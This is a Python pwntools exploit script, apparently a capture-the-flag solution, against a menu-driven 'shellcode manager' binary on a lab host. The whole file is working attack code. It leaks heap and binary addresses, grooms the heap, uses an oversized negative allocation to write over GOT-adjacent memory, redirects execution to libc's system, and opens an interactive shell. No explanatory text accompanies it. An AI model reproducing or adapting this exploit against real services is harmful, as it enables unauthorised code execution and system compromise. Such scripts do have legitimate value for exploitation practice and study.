#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

from pwn import *
import sys
import ctypes
from time import sleep

if len(sys.argv) > 1:
	p = remote('192.168.184.135', 8899)
else:
	p = process('./', env = {'LD_PRELOAD':''})
ru = p.recvuntil
r = p.recv
sl = p.sendline
s = p.send
I = p.interactive

debugger_attached = 0


def pause():
	raw_input('>')

def w(f = 0):
	global p
	global debugger_attached
	if not debugger_attached and not f:
		proc.wait_for_debugger(p.pid)
	else:
		raw_input('paused> ')
	debugger_attached = 1

def req2sz32(req):
	return ( (req + 4 + 7) & ~7 )

def req2sz64(req):
	return ( (req + 8 + 15) & ~15 )

C = ctypes.CDLL("libc.so.6")
srand = C.srand
rand = C.rand
time = C.time

def create(sz, sh):
	s('1\n')
	sleep(0.3)
	print ru('shellcode size:')
	s(str(sz) + '\n')
	print ru('shellcode name:')
	sleep(0.3)
	s('bit' + '\n')
	print ru('shellcode description:')
	s('des' + '\n')
	sleep(0.3)
	print ru('shellcode:')
	s(sh + '\n')
	sleep(0.3)
	print ru('Option:')


def list():
	s('2\n')
	print ru('Option:')

def dele(i):
	s('3\n')
	print ru('shellcode index:')
	s(str(i) + '\n')
	print ru('Option:')

def exploit():
	print ru('Global memory alloc at ')
	H = int(r(8), 16)
	print hex(H)

	print ru('leave your name')
	s('A'*28 + '\n')
	print ru('A'*28)
	offset = 176
	t = ( r(4).replace('\r', '').replace('\n', '').ljust(4, '\x00') )
	print repr(t), len(t)
	binbase = u32( t ) - 0xafa
	got = binbase + 0x20f8
	A =  binbase + 17400
	sz = ctypes.c_int( (0xffffffff - (H+35) + 1) + A).value

	for i in xrange(19):
		create(1, 'A')
	create(16, p32(got) + p32(got) + p32(32) + p32(got))
	s('1\n')
	print ru('shellcode size:')
	s(str(sz) + '\n')
	
	#pause()
	print ru('Option:')
	dele(5)
	dele(6)
	create(8, p32(H+19)*2)

	s('2\n')
	ru('\r\n')
	system = u32( r(4)) + offset
	print hex(system)
	create((44 + 9*4), p32(system)*4 + p32(A + 8) + p32(0)*(15))
	print 'size', hex(sz)
	print 'Array', hex(A)
	print 'base', hex(binbase)
	print 'HEAP', hex(H)

	s('4\n')
	print ru('shellcode index:')
	s('6\n')
	I()



if __name__ == '__main__':
	exploit()

